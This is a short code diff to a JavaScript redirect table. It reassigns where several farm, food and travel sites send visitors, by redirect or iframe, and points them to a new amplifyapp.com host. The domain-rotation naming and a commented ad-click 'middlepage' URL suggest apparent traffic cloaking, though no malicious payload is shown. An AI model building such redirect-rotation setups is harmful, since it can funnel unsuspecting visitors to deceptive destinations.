@@ -85,9 +85,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairyfarm.netlify.app": { method: "redirect", target: "https://twocookie-site.onrender.com" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://twocookie-site.onrender.com" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://twocookie-site.onrender.com" },
+    "https://naotoshidairyfarm.netlify.app": { method: "redirect", target: "https://main.d1j57qtbw24v19.amplifyapp.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d1j57qtbw24v19.amplifyapp.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d1j57qtbw24v19.amplifyapp.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
@@ -95,7 +95,7 @@ const ORIGIN_GROUPS = {
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
   },
   aomine: {
-    "https://classy-daffodil-ad4c44.netlify.app": { method: "redirect", target: "https://twocookie-site.onrender.com" },
+    "https://classy-daffodil-ad4c44.netlify.app": { method: "redirect", target: "https://main.d1j57qtbw24v19.amplifyapp.com" },
   },
 };
 
